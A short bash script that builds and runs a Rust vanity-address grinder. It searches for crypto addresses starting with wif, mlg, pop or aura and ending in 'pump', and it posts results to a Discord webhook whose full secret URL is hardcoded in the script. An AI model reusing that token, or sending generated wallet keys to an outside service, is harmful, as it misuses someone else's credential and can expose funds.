#!/bin/bash

# Simple script to search for wif, mlg, pop, aura all ending with "pump"
# Case-insensitive matching

echo "=================================="
echo "  Vanity Address Finder"
echo "=================================="
echo ""
echo "Searching for addresses that:"
echo "  - Start with: wif, mlg, pop, OR aura"
echo "  - End with: pump"
echo "  - Case insensitive"
echo ""
echo "Press Ctrl+C to stop"
echo ""

# Build if not already built
if [ ! -f "target/release/vanity-grinder" ]; then
    echo "Building project..."
    cargo build --release
    echo ""
fi

# Run the multi-prefix search
./target/release/vanity-grinder multi-prefix \
    --prefixes "wif,mlg,pop,aura" \
    --suffix "pump" \
    --no-case-sensitive \
    --webhook "https://discord.com/api/webhooks/1447635716577169483/oRtAG1YjD3wwVKgVeOJ-F22-syubzOON4KE4inRDNpcFn7PkYzBVsPK-wzGaf-4pIPm1"
